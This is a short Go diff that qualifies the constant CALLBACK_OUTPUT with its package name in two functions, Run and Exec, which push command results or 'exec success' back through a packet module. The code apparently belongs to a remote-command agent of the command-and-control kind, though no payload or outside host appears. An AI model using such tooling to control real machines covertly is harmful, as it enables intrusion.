@@ -29,7 +29,7 @@ func Run(b []byte) error {
 	if err != nil {
 		return err
 	}
-	packet.PushResult(CALLBACK_OUTPUT, result)
+	packet.PushResult(packet.CALLBACK_OUTPUT, result)
 	return nil
 	//path = strings.Trim(path, " ")
 	//args = strings.Trim(args, " ")
@@ -64,7 +64,7 @@ func Exec(b []byte) error {
 	if err != nil {
 		return err
 	}
-	packet.PushResult(CALLBACK_OUTPUT, []byte("exec success"))
+	packet.PushResult(packet.CALLBACK_OUTPUT, []byte("exec success"))
 	return nil
 	//parts := strings.SplitN(string(b), " ", 2)
 	//var cmd *exec.Cmd
